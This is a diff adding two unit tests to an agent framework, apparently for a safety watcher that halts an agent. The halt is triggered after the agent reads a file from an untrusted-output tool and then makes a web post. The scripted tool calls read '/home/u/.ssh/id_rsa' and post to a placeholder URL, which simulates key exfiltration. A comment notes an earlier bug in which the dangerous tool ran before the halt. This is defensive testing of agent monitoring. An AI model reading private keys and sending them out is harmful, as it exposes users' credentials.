@@ -449,6 +449,112 @@ describe('AgentLoop — Ch.3d post-untrusted-read downgrade', () => {
     expect(terminalEnd?.ok).toBe(true);
   });
 
+  it('forwards events to the watcher and terminates on suspicious sequence', async () => {
+    const { Watcher, suspiciousSequenceRule } = await import('@ethosagent/safety-watcher');
+    const tools = new DefaultToolRegistry();
+    tools.register({
+      name: 'read_file',
+      description: 'r',
+      schema: { type: 'object' },
+      outputIsUntrusted: true,
+      async execute(): Promise<ToolResult> {
+        return { ok: true, value: 'innocent file content' };
+      },
+    });
+    tools.register({
+      name: 'web_post',
+      description: 'p',
+      schema: { type: 'object' },
+      async execute(): Promise<ToolResult> {
+        return { ok: true, value: 'posted' };
+      },
+    });
+    const llm = makeScriptedLLM([
+      {
+        toolCalls: [{ id: 't1', name: 'read_file', input: { path: '/home/u/.ssh/id_rsa' } }],
+        finishReason: 'tool_use',
+      },
+      {
+        toolCalls: [{ id: 't2', name: 'web_post', input: { url: 'http://x' } }],
+        finishReason: 'tool_use',
+      },
+      { text: 'ok', finishReason: 'end_turn' },
+    ]);
+
+    // Disable the post-read downgrade so we exercise the watcher path,
+    // not the Ch.3d block (which would also reject the web_post here).
+    const personalities = new DefaultPersonalityRegistry();
+    personalities.define({
+      id: 'default',
+      name: 'Default',
+      safety: {
+        injectionDefense: {
+          postReadDowngrade: { tools: ['nothing_real'] },
+        },
+      },
+    });
+    personalities.setDefault('default');
+
+    const watcher = new Watcher({ rules: [suspiciousSequenceRule()] });
+    const loop = new AgentLoop({ llm, tools, personalities, watcher });
+    const events = await collect(loop.run('go'));
+    const err = events.find((e): e is Extract<AgentEvent, { type: 'error' }> => e.type === 'error');
+    expect(err).toBeDefined();
+    expect(err?.code).toMatch(/watcher_suspicious-sequence/);
+  });
+
+  // Regression for the Codex finding: the watcher decision on a
+  // tool_start MUST prevent the tool's execute() from being called
+  // in the same batch. Previously the halt was checked at the top of
+  // the next iteration, so the dangerous tool ran anyway.
+  it('does not call execute() when watcher terminates on tool_start in the same batch', async () => {
+    const { Watcher, suspiciousSequenceRule } = await import('@ethosagent/safety-watcher');
+    let webPostCalls = 0;
+    const tools = new DefaultToolRegistry();
+    tools.register({
+      name: 'read_file',
+      description: 'r',
+      schema: { type: 'object' },
+      outputIsUntrusted: true,
+      async execute(): Promise<ToolResult> {
+        return { ok: true, value: 'innocent file content' };
+      },
+    });
+    tools.register({
+      name: 'web_post',
+      description: 'p',
+      schema: { type: 'object' },
+      async execute(): Promise<ToolResult> {
+        webPostCalls++;
+        return { ok: true, value: 'posted' };
+      },
+    });
+    const llm = makeScriptedLLM([
+      {
+        toolCalls: [{ id: 't1', name: 'read_file', input: { path: '/home/u/.ssh/id_rsa' } }],
+        finishReason: 'tool_use',
+      },
+      {
+        toolCalls: [{ id: 't2', name: 'web_post', input: { url: 'http://x' } }],
+        finishReason: 'tool_use',
+      },
+      { text: 'ok', finishReason: 'end_turn' },
+    ]);
+
+    const personalities = new DefaultPersonalityRegistry();
+    personalities.define({
+      id: 'default',
+      name: 'Default',
+      safety: { injectionDefense: { postReadDowngrade: { tools: ['nothing_real'] } } },
+    });
+    personalities.setDefault('default');
+
+    const watcher = new Watcher({ rules: [suspiciousSequenceRule()] });
+    const loop = new AgentLoop({ llm, tools, personalities, watcher });
+    await collect(loop.run('go'));
+    expect(webPostCalls).toBe(0);
+  });
+
   it('respects `injectionDefense.enabled = false` (disables the entire defense)', async () => {
     const tools = new DefaultToolRegistry();
     tools.register(makeUntrustedTool('read_file', 'content'));
